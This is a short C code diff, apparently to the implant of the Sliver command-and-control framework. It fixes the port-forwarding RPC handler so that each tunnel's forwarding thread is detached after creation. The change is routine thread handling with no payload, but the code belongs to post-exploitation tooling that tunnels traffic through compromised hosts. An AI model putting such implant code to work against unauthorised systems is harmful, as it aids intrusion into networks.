@@ -289,10 +289,14 @@ int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
       f->pending_len = 0;
     }
     f->thread_running = 1;
-    if (sliver_thread_create(forward_thread, f) == NULL) {
-      f->thread_running = 0;
-      forward_release(f);
-      return -1;
+    {
+      sliver_thread_t *th = sliver_thread_create(forward_thread, f);
+      if (th == NULL) {
+        f->thread_running = 0;
+        forward_release(f);
+        return -1;
+      }
+      sliver_thread_detach(th);
     }
     goto respond;
   }
@@ -314,10 +318,14 @@ int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
   LOG_INFO("portfwd: connected %s:%u tunnel=%llu", host, (unsigned)port,
            (unsigned long long)id);
   f->thread_running = 1;
-  if (sliver_thread_create(forward_thread, f) == NULL) {
-    f->thread_running = 0;
-    forward_release(f);
-    return -1;
+  {
+    sliver_thread_t *th = sliver_thread_create(forward_thread, f);
+    if (th == NULL) {
+      f->thread_running = 0;
+      forward_release(f);
+      return -1;
+    }
+    sliver_thread_detach(th);
   }
 respond:
   /* Portfwd{Host=3, Port=1, TunnelID=8, Response=9}. */
@@ -371,6 +379,7 @@ int sliver_portfwd_tunnel_close(uint64_t tunnel_id) {
   forward_release(f);
   return 1;
 }
+
 
 
 
